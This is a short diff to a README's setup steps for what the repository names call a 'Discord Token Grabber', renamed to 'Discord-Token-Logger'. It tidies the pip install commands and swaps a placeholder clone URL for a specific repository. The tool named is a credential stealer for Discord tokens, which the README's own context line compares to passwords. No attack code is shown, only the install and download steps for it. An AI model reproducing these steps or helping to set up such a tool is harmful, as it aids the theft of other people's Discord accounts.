@@ -128,18 +128,14 @@ Discord tokens are like passwords. If someone gets your token, they can access y
 ### 📦 Step 1: Install Required Libraries
 
 Open your terminal/command prompt and run:
-
+```bash
 pip install requests
-pip install discord-webhook
-
-Or install both at once:
-
-pip install requests discord-webhook
+```
 
 ### 📥 Step 2: Get the Code
 ```bash
-git clone https://github.com/your-username/Discord-Token-Grabber.git
-cd Discord-Token-Grabber
+git clone https://github.com/timzz71/Discord-Token-Logger.git
+cd Discord-Token-Logger
 ```
 
 Or download the ZIP file and extract it.
